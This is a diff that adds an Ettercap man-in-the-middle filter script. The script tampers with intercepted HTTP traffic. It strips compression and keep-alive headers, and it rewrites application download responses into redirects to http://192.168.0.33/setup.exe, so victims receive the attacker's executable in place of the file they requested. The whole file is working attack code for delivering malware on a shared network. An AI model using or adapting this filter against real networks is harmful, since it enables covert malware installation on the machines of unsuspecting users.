@@ -1,0 +1,55 @@
+########################################################################
+# replace.filter     --- Ettercap Filter (Application replacement)     #
+# g0tmi1k 2011-03-09 --- 3x 192.168.0.33 <--- including this one!      #
+########################################################################
+if (ip.proto == TCP && ip.dst != '192.168.0.33') {                                         # If traffic is TCP protocol and its not coming to us....
+   if (search(DATA.data, "gzip")) {                                                        # ...and if it contains an gzip in its header:
+      replace("gzip", "    ");                                                             # Ask the server not to encode packets - only use plain text ;) *Four spaces to match original string*
+      msg("[*] Zapped 'gzip'\n");                                                          # Let us know it's been done (=
+   }
+   if (search(DATA.data, "deflate")) {
+      replace("deflate", "       ");
+      msg("[*] Zapped 'deflate'\n");
+   }
+   if (search(DATA.data, "gzip,deflate")) {
+      replace("gzip,deflate", "            ");
+      msg("[*] Zapped 'gzip,deflate'\n");
+   }
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!");
+      msg("[*] Zapped 'Accept-Encoding'\n");
+   }
+
+   if (tcp.src == 80) {                                                                      # Coming from the web server ???
+      if (search(DATA.data, "keep-alive")) {
+         replace("keep-alive", "close     ");                                                # ....so stop them sending any more requests
+         msg("[*] Zapped 'keep-alive'\n");
+      }
+      if (search(DATA.data, "keep-alive")) {
+         replace("keep-Alive", "close     ");
+         msg("[*] Zapped 'keep-Alive'\n");
+      }
+   }
+#-----------------------------------------------------------------------
+   #log(DECODED.data, "/root/log.log");
+   if (ip.proto == TCP && search(DATA.data, ": application") ){
+      #if (search(DATA.data, "Win32")) {                                                      # Could use MSDOS ??? ***
+         msg("[>] Found application....\n");                                                  # Let us know we have done it (=
+         if (search(DATA.data, "301 Moved Permanently")) {
+            replace("Location: ", "Location: http://192.168.0.33/setup.exe #");
+            msg("[>] Replacing application (Replacing)....\n");                               # Let us know we have done it (=
+         }
+
+         if (search(DATA.data, "200 OK")) {
+            replace("200 OK", "301 Moved Permanently
+Location: http://192.168.0.33/setup.exe");                                                    # Replace HTML code??? ***
+            msg("[>] Replacing application (Clean)....\n");                                   # Let us know we have done it (=
+         }
+
+      #}
+   }
+
+   if (search(DATA.data, "http://192.168.0.33")){                                             # ...and search data, to test for our 'tweak' ;)
+      msg("[+] Replace correctly!\n");                                                        # Let us know it's been done done
+   }
+}
